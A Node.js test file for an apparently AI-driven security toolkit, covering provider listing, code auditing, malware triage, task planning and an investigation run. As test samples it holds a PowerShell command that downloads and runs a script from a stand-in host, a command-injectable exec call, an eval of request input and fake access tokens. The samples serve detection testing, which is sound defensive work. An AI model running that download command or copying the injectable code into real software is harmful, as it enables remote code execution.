import test from 'node:test';
import assert from 'node:assert/strict';

import { aiProvider } from '../lib/ai-provider/index.ts';
import { securityToolRegistry } from '../lib/cybersecurity/tools.ts';
import { cybersecurityPlanner } from '../lib/cybersecurity/planner.ts';
import { cybersecurityOrchestrator } from '../lib/cybersecurity/orchestrator.ts';
import { cybersecurityStorage } from '../lib/cybersecurity/storage.ts';

test('AI Provider Manager accounts for all primary credentials', () => {
  const statuses = aiProvider.getProviderStatuses();
  const providerIds = statuses.map((p) => p.id);
  assert.ok(providerIds.includes('openai_primary'));
  assert.ok(providerIds.includes('openai_secondary'));
  assert.ok(providerIds.includes('deepseek'));
  assert.ok(providerIds.includes('anthropic'));
  assert.ok(providerIds.includes('gemini'));
  assert.ok(providerIds.includes('local'));
});

test('SecurityToolRegistry discovers secrets and code vulnerabilities', async () => {
  const badCode = `
    const accessKey = "AKIA1234567890123456";
    function run(param) {
      require('child_process').exec(\`cat \${param}\`);
    }
  `;
  const result = await securityToolRegistry.auditSourceCode(badCode, 'vulnerable.js');
  assert.equal(result.success, true);
  assert.ok(result.findings.length >= 2);
  const titles = result.findings.map(f => f.title);
  assert.ok(titles.some(t => t.includes('AWS Access Key ID')));
  assert.ok(titles.some(t => t.includes('Command Injection')));
});

test('SecurityToolRegistry performs malware triage and entropy', async () => {
  const testBuffer = Buffer.from('PowerShell -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString(\'http://bad.org\')"', 'utf-8');
  const result = await securityToolRegistry.analyzeMalwareFile(testBuffer, 'suspicious.ps1');
  assert.equal(result.success, true);
  assert.ok(result.stdout.includes('MD5:'));
  assert.ok(result.stdout.includes('SHA256:'));
  assert.ok(result.findings.length > 0);
});

test('CybersecurityPlanner decomposes web and network requests into tasks', () => {
  const planWeb = cybersecurityPlanner.createPlan('Audit https://myapp.example.com for vulnerabilities');
  assert.equal(planWeb.category, 'web_security');
  assert.equal(planWeb.target, 'https://myapp.example.com');
  assert.ok(planWeb.tasks.length >= 4);

  const planNet = cybersecurityPlanner.createPlan('Perform port scan on 127.0.0.1 within authorized scope');
  assert.equal(planNet.category, 'network_scan');
  assert.equal(planNet.target, '127.0.0.1');
  assert.ok(planNet.tasks.length >= 3);
});

test('CybersecurityOrchestrator runs full investigation lifecycle', async () => {
  const invId = `test-inv-${Date.now()}`;
  const res = await cybersecurityOrchestrator.executeInvestigation(
    invId,
    'Audit code snippet for security flaws',
    {
      filename: 'test.js',
      content: 'const token = "ghp_123456789012345678901234567890123456"; eval(req.body);',
    }
  );

  assert.equal(res.investigation.id, invId);
  assert.equal(res.investigation.status, 'completed');
  assert.ok(res.investigation.findings.length > 0);
  assert.ok(res.report.length > 50);

  const saved = cybersecurityStorage.get(invId);
  assert.equal(saved?.id, invId);
});
